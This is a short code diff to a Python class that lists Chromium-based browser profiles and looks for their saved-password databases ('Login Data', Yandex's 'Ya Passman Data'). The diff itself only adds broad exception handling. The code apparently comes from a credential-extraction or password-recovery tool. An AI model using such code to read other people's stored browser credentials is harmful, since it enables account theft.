@@ -37,13 +37,16 @@ class ChromiumBased:
 
         # Add profiles from Local State
         with open(self.local_state_path, 'r', encoding='utf-8') as f:
+            try:
                 data = json.load(f)
                 profiles |= set(data['profile']['info_cache'])
+            except:
+                pass
 
         for profile in profiles:
             try:
                 files = os.listdir(os.path.join(self.user_data_path, profile))
-            except Exception:
+            except:
                 continue
             for db in files:
                 if db.lower() in ['login data', 'ya passman data']:
